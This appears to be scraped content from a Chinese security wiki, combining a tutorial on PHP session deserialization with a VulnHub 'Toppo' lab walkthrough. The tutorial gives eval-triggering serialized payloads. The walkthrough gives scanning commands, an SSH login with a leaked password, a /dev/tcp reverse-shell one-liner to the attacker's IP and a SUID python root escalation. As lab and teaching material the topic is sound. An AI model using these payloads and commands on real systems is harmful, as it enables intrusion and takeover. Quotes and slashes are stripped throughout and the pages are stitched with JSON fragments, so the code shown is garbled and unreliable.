__DESTRUCTPHP中SESSION反序列化（重点）简介与基础知识在php.ini中存在三项配置项： session.save_path= –设置session的存储路径 session.save_handler= –设定用户自定义session存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式) session.auto_start boolen –指定会话模块是否在请求开始时启动一个会话，默认为0不启动 session.serialize_handler string –定义用来序列化反序列化的处理器名字。默认使用php (php5.5.4) 以上的选项就是与PHP中的Session 存储 和 序列化存储 有关的选项。 在使用xampp组件安装中，上述的配置项的设置如下： session.save_path=D:\\xampp\\tmp 表明所有的session文件都是存储在xampptmp下 session.save_handler=files 表明session是以文件的方式来进行存储的 session.auto_start=0 表明默认不启动session session.serialize_handler=php 表明session的默认序列化引擎使用的是php序列话引擎 在上述的配置中，session.serialize_handler是用来设置session的序列化引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。 引擎 session存储方式 php(php5.5.4) 存储方式是，键名+竖线 php_serialize(php5.5.4) 存储方式是，经过serialize()函数序列化处理的键和值（将session中的key和value都会进行序列化） php_binary 存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 在PHP (php5.5.4) 中默认使用的是PHP引擎，如果要修改为其他的引擎，只需要添加代码ini_set(session.serialize_handler, 需要设置的引擎名);进行设置。 示例代码如下： php ?phpini_set(session.serialize_handler, php_serialize); //设置序列化引擎使用php_serializesession_start();// do something...... 存储机制 **php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。**存储的文件是以sess_sessionid(PHPSESSID)来进行命名的，文件的内容就是session值经过serialize()函数序列化之后的内容。假设我们的环境是xampp，那么默认配置如上所述。 在默认配置情况下（在php引擎下：）： php ?phpsession_start() // session_start()会创建新会话或者重用现有会话$_SESSION[name] = spoock;var_dump();? 可以看到PHPSESSID的值是jo86ud4jfvu81mbg28sl2s56c2，所以在xampptmp下存储的文件名是sess_jo86ud4jfvu81mbg28sl2s56c2，文件的内容是name|s:6:spoock; 。name是键值，s:6:spoock;是serialize(spoock)的结果（php引擎方式存储：键名+竖线 |+经过serialize()函数序列处理的值）。 在php_serialize引擎下： php ?phpini_set(session.serialize_handler, php_serialize); // 设置序列化引擎使用php_serializesession_start(); // 启动新会话或者重用现有会话 $_SESSION[name] = spoock; var_dump();? SESSION文件的内容是a:1:{s:4:name;s:6:spoock;} 。a:1是使用php_serialize进行序列话都会加上。同时使用php_serialize会将session中的key(键)和value(值)都会进行序列化。 在php_binary引擎下：存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值 php ?phpini_set(session.serialize_handler, php_binary);session_start();$_SESSION[name] = spoock;var_dump();? SESSION文件的内容是names:6:spoock; 。由于name的长度是4，4在ASCII表中对应的就是EOT（这个）。根据php_binary的存储规则，最后就是names:6:spoock; 。(突然发现ASCII的值为4的字符无法在网页上面显示，这个大家自行去查ASCII表吧) SESSION序列化漏洞利用php ?phpclass syclover var $func=; function __construct() // __construct()在实例化是被调用 $this-func = phpinfo(); function __wakeup() eval($this-func); unserialize($_GET[a]);? 在11行对传入的参数进行了反序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问localhost/test.php?a=O:8:syclover:1:{s:4:func;s:14:echo spoock;;} 。那么反序列化得到的内容是： php object(syclover)[1] public func = string echo spoock; (length=14) **最后页面输出的就是spoock，说明最后执行了我们定义的echo “spoock”;方法。**这就是一个简单的序列化的漏洞的演示 PHP SESSION中的序列化危害PHP中的Session的实现是没有的问题的，危害主要是由于程序员的Session使用不当而引起的。**如果设置的session序列化选择器与默认的不同的话就可能会产生漏洞（会导致数据无法正确的反序列化）。**通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如: php $_SESSION[spoock] = |O:11:PeopleClass:0:; 上述的$_SESSION的数据如果使用php_serialize，那么最后的存储的内容就是a:1:{s:6:spoock;s:24:|O:11:PeopleClass:0:{};} 。 但是我们在进行读取的时候，如果选择的是php，那么最后读取的内容是： php array (size=1) a:1:s:6:spoock;s:24: = object(__PHP_Incomplete_Class)[1] public __PHP_Incomplete_Class_Name = string PeopleClass (length=11) 这是因为当使用php引擎的时候，php引擎会以竖杠 | 作为作为key(键)和value(值)的分隔符，那么就会将a:1:{s:6:“spoock”;s:24:”作为SESSION的key(键)，将O:11:“PeopleClass”:0:{}作为value(值)，然后进行反序列化，最后就会得到PeopleClas这个类。 这种由于序列化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。 实际利用存在s1.php和us2.php这两个文件，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞。 s1.php，使用php_serialize来处理session php ?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[spoock]=$_GET[a]; us2.php，使用php来处理session php ini_set(session.serialize_handler, php);`localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;`session_start();class lemon var $hi; function __construct() $this-hi = phpinfo();; function __destruct() eval($this-hi); // O:5:lemon:1:s:2:hi;s:14:echo spoock;; 此题在s1.php中有可以传入session的点，所以就不用构造表单了，这题的突破点在哪里，没错，就是我备注的那块s2.php中ini_set(session.serialize_handler, php);，选择session序列化处理器。 当访问s1.php时，提交如下的数据并存储到session文件中： php localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;1 此时传入的数据会按照php_serialize来进行序列化，由s2.php读取时按照php来反序列化。 O:5:“lemon”:1:{s:2:“hi”;s:14:“echo “spoock”;”;}由以下序列化来得到，在加上一个竖杠 |就行了 php ?phpclass lemon public $hi=xxxxx;$obj = new lemon();echo serialize($obj);?xxxxx处按照你想执行的代码来填写，这里填的是echo spoock 此时访问us2.php时，页面输出，spoock成功执行了我们构造的函数。因为在访问us2.php时，程序会按照php来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。"},{"path":"/wiki/WP/Windows提权/vulnhub/Toppo.html","content":"前提 kali ip 192.168.129.152 靶机 NAT 模式 信息收集检测ipnmap -sP 192.168.129.024 ip 是192.168.129.165 检测端口nmap -sT -sV -Pn 192.168.129.165 -p- -A 扫的太慢了的话，换这个nmap -sS -sV -Pn 192.168.129.165 -p- -A -sS 就是 TCP SYN 半连接扫描 22,80,111端口开放 渗透测试先看比较重要的80端口 80端口服务器是Apache 2.4.10 博客是start Bootstrap 搭建的 搜索Apache历史漏洞 这有点多了，ehole检测一下指纹信息，缩小选项 缩小不了，先看只有Apache的， 貌似失败了 searchsploit Bootstrap 只有xss，貌似不能getshell 目录扫描一波python dirsearch.py -u http://192.168.129.165/ 有个admin目录，查看一下 查看notes.txt 有一个密码，然后尝试访问一下，看有没有登陆处mail里什么都没有 http://192.168.129.165/vendor/ 这个好像是个目录,目录穿越失败 http://192.168.129.165/manual/en/index.html ok,网页端没有登陆界面111端口searchsploit rpcbind 好像都是dos攻击 没想到还有一个ssh登录，尝试一下密码是12345ted123，账号可能是ted尝试登陆 登陆成功 提权 这个就不用反弹shell了，当然，愿意的话也可以sh -i devtcp192.168.129.1525555 01 尝试sudo提权 查看etcpasswd只有一个用户 suid尝试查看是否有特权文件find -perm -us -type f 2devnull 尝试python2.7提权usrbinpython2.7 -c ‘import os; os.setuid(0); os.system(“binbash”)’"}]